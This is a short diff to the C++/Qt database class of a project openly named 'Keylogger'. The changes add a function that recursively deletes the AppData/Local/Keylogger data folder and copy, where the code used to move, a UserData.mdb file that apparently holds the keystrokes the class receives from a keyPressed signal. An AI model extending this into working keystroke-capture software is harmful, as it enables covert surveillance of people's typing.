@@ -9,6 +9,7 @@
 #include "signalemitter.h"
 
 QSqlDatabase dataBase;
+QString DataBase::dataPath;
 
 DataBase::DataBase(QObject *parent) : QObject(parent)
 {
@@ -27,6 +28,12 @@ DataBase::DataBase(QObject *parent) : QObject(parent)
     connect(Emitter::Instance(), &SignalEmitter::keyPressed, this, &DataBase::keyPressed);
 }
 
+void DataBase::deleteDataFile()
+{
+    static QDir deleteFilePath(dataPath);
+    deleteFilePath.removeRecursively();
+}
+
 bool DataBase::isQueryFound(QSqlQuery searchQuery)
 {
     while(searchQuery.next()) {
@@ -37,15 +44,16 @@ bool DataBase::isQueryFound(QSqlQuery searchQuery)
 
 void DataBase::makeDataFile()
 {
-    QStringList homePath = QStandardPaths::standardLocations(QStandardPaths::HomeLocation);
-    QString dataPath = homePath.first() + "/AppData/Local/Keylogger";
+    const static QStringList homePath = QStandardPaths::standardLocations(QStandardPaths::HomeLocation);
+    dataPath = homePath.first() + "/AppData/Local/Keylogger";
     if(!QDir().exists(dataPath)) {
         QDir().mkdir(dataPath);
     }
 
     filePath = dataPath + "/UserData.mdb";
     if(!QFile().exists(filePath)) {
-        QDir().rename(QDir::currentPath() + "/UserData.mdb", filePath);
+        QFile::copy(QDir::currentPath() + "/UserData.mdb", filePath);
+//        QDir().rename(QDir::currentPath() + "/UserData.mdb", filePath); //move file
     }
 }
 
